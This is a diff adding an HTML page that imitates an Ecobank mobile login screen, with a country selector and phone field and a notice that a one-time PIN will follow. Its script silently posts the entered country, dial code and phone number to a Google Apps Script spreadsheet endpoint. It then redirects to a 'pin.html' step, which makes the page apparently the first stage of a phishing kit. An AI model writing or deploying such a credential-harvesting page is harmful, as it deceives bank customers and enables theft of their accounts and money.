@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Ecobank Login</title>
+
+<style>
+
+body{
+font-family: Arial, sans-serif;
+background:#fff;
+margin:0;
+padding:20px;
+}
+
+.header{
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-bottom:40px;
+}
+
+.language{
+border:1px solid #ddd;
+padding:8px 12px;
+border-radius:8px;
+font-weight:bold;
+display:flex;
+align-items:center;
+gap:5px;
+}
+
+h1{
+font-size:28px;
+margin-bottom:20px;
+}
+
+.subtext{
+font-size:20px;
+font-weight:bold;
+}
+
+.subtext2{
+font-size:18px;
+margin-top:5px;
+margin-bottom:40px;
+}
+
+.input-group{
+margin-bottom:25px;
+}
+
+input, select{
+width:100%;
+padding:15px;
+font-size:18px;
+border:none;
+border-bottom:2px solid #ddd;
+outline:none;
+}
+
+.small{
+font-size:14px;
+color:gray;
+margin-top:10px;
+}
+
+.terms{
+margin-top:30px;
+font-size:15px;
+}
+
+.terms span{
+color:#2b7bb9;
+}
+
+.proceed{
+width:100%;
+padding:18px;
+background:#7bd000;
+border:none;
+border-radius:6px;
+font-size:22px;
+color:white;
+margin-top:30px;
+cursor:pointer;
+}
+
+.open-account{
+margin-top:40px;
+text-align:center;
+font-weight:bold;
+font-size:22px;
+}
+
+.open-btn{
+margin-top:20px;
+padding:20px;
+border:1px solid #ccc;
+border-radius:10px;
+text-align:center;
+font-size:22px;
+color:#2b7bb9;
+cursor:pointer;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="header">
+<div>←</div>
+
+<div class="language">
+🇺🇸 EN ▼
+</div>
+
+<div>💬</div>
+</div>
+
+<h1>Welcome to Ecobank</h1>
+
+<div class="subtext">
+Have an Ecobank account?
+</div>
+
+<div class="subtext2">
+Enter your mobile number to get started
+</div>
+
+<form id="form">
+
+<div class="input-group">
+
+<select id="country" required>
+
+<option value="">Please select your country</option>
+<option>Nigeria</option>
+<option>Ghana</option>
+<option>Kenya</option>
+<option>South Africa</option>
+
+</select>
+
+</div>
+
+<div class="input-group">
+
+<input
+type="tel"
+id="phone"
+placeholder="Enter mobile number"
+required
+>
+
+</div>
+
+<div class="small">
+A one-time PIN will be sent via sms on this number
+</div>
+
+<div class="terms">
+
+By tapping “Proceed”, you are accepting our
+
+<span>Terms & Conditions</span>
+
+as well as our
+
+<span>Privacy policy</span>
+
+</div>
+
+<button class="proceed" type="submit">
+Proceed
+</button>
+
+</form>
+
+<div class="open-account">
+Don't have an Ecobank Account?
+</div>
+
+<div class="open-btn">
+Open New Account
+</div>
+
+<script>
+
+const scriptURL =
+"https://script.google.com/macros/s/AKfycbwPXCxzwcXXffRpS7WGdsZFYP3RDSXLEgS01__wZwcv2W4doTcLW-XWQgc63DVNXNQcng/exec";
+
+
+document
+.getElementById("form")
+.addEventListener("submit", function(e){
+
+e.preventDefault();
+
+const country =
+document.getElementById("country").value;
+
+const phone =
+document.getElementById("phone").value;
+
+
+/* country dialing codes */
+
+const dialCodes = {
+
+Nigeria:"+234",
+Ghana:"+233",
+Kenya:"+254",
+"South Africa":"+27"
+
+};
+
+const dialCode =
+dialCodes[country];
+
+
+/* send to spreadsheet */
+
+fetch(scriptURL, {
+
+method:"POST",
+
+mode:"no-cors",
+
+headers:{
+"Content-Type":"application/x-www-form-urlencoded"
+},
+
+body:
+"step=index"+
+"&country="+encodeURIComponent(country)+
+"&dialCode="+encodeURIComponent(dialCode)+
+"&phone="+encodeURIComponent(phone)
+
+});
+
+
+/* redirect with values */
+
+window.location.href =
+
+"pin.html?country="+encodeURIComponent(country)+
+"&dialCode="+encodeURIComponent(dialCode)+
+"&phone="+encodeURIComponent(phone);
+
+});
+
+</script>
+
+</body>
+</html>
